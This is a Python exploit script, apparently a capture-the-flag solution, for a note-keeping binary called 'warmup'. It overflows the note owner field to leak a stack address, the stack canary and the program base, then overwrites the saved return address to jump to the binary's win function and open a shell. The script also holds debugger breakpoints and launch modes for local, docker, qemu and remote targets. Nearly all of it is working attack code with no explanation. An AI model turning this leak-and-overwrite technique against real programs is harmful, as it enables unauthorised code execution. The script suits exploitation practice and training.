#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    # log_level='debug',
    binary=ELF('./warmup', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata

# d2d_ida

brva 0x1B06
brva 0x18F0
brva 0x19B6
brva 0x1A05
brva 0x16DE
brva 0x1791

brva 0x1C11
brva 0x1BCD
brva 0x1BAB

brva 0x16B2
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 9001)
        context.update(terminal = ['tmux', 'splitw', '-h', '-l', '175', '-P', "-d"]) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/challenge/warmup"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=True)


def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]


def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()


def new_note(owner: bytes, msg: bytes):
    sla(b':', b'1')
    sla(b'owner :', owner)
    sla(b'message :', msg)


def update_note(id: int, choice: int, owner: bytes=None, msg: bytes=None, state: int=None):
    sla(b':', b'2')
    slna(b':', id)
    slna(b':', choice)

    if choice == 1:
        sla(b'owner :', owner)
    elif choice == 2:
        sla(b'message :', msg)
    else:
        slna(b'No', state)


def view_note(id: int):
    sla(b':', b'3')
    slna(b':', id)

# ==================== EXPLOIT ====================
p = start()

new_note(b'A'*8, b'B'*16)
update_note(0, 1, owner=b'C'*19)
view_note(0)

ru(b'C'*19 + b'\n')
stack_leak = u64(r(6).ljust(0x8, b'\0'))
slog('stack leak @ %#x', stack_leak)

update_note(0, 1, owner=b'D'*20 + p64(stack_leak + 0x139))
view_note(0)
ru(b'Program run at : ')

canary = u64(b'\0' + r(7))
slog('canary @ %#x', canary)

if args.DOCKER or args.REMOTE:
    update_note(0, 1, owner=b'E'*20 + p64(stack_leak + 0x168))
else:
    update_note(0, 1, owner=b'E'*20 + p64(stack_leak + 0x158))
    
view_note(0)

ru(b'Program run at : ')
exe.address = fixleak(rl()[:-1]) - exe.sym.main
slog('code base @ %#x', exe.address)

# debug()
update_note(0, 1, owner=flat({
    0x28: canary,
    0x30: 0,
    0x38: exe.sym.win+5,
}, filler=b'\0'))

sl(b'ls -la')
interactive()
